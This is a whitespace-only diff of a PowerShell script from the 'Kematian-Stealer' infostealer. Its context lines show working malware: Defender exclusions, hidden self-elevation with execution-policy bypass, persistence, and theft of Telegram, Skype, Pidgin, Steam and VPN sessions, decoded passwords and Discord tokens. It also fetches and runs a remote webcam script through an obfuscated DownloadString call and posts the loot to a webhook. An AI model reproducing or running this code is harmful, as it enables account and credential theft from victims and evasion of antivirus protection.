@@ -75,7 +75,7 @@ function CHECK_AND_PATCH {
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
     if ($persistence) {
-		Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
+        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
         Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
         New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force | Out-Null
         # Hidden Directory
@@ -128,7 +128,7 @@ function Request-Admin {
         else {
             try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
         } 
-    }	
+    }    
 }
 
 function Backup-Data {
@@ -321,7 +321,7 @@ function Backup-Data {
 
 
     # All Messaging Sessions
-	
+    
     # Telegram Session
     function telegramstealer {
         $processname = "telegram"
@@ -455,7 +455,7 @@ function Backup-Data {
         Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
     }
     skype_stealer
-	
+    
     function pidgin_stealer {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
         if (!(Test-Path $pidgin_folder)) { return }
@@ -466,7 +466,7 @@ function Backup-Data {
     pidgin_stealer
 
     # All Gaming Sessions
-	
+    
     # Steam Session Stealer
     function steamstealer {
         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
@@ -581,7 +581,7 @@ function Backup-Data {
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
     }
     surfsharkvpnstealer
-	
+    
     # OpenVPN 
     function openvpn_stealer {
         $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
@@ -714,7 +714,7 @@ Pass: $decodedPass
     #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
 
     # Fix webcam hang with unsupported devices
-	
+    
     Write-Host "[!] Capturing an image with Webcam !" -ForegroundColor Green
     $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
@@ -852,9 +852,9 @@ Pass: $decodedPass
         $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
         $dirs | ForEach-Object { Remove-Item $_ -Force }
     } while ($dirs.Count -gt 0)
-	
+    
     Write-Host "[!] Getting information about the extracted data !" -ForegroundColor Green
-	
+    
     function ProcessCookieFiles {
         $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
         $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
@@ -879,9 +879,9 @@ Pass: $decodedPass
         }
     }
     ProcessCookieFiles 
-	
+    
     # Send info about the data in the Kematian.zip
-    function kematianinfo {	
+    function kematianinfo {    
         $messaging_sessions_info = if (Test-Path $folder_messaging) {
             $messaging_sessions_content = Get-ChildItem -Path $folder_messaging -Directory | ForEach-Object { $_.Name -replace '\..+$' }
             if ($messaging_sessions_content) {
@@ -998,9 +998,9 @@ FileZilla: $filezilla_info
 "@
 
         return $webhookData
-    }	 
+    }     
     $kematainwebhook = kematianinfo
-	
+    
     # Send discord tokens in webhook message 
     $discord_tokens = if (Test-Path "$folderformat\discord.json") {
         $jsonContent = Get-Content -Path "$folderformat\discord.json" -Raw
@@ -1079,7 +1079,7 @@ FileZilla: $filezilla_info
 
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
-	
+    
     # Send webcam
     
     $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
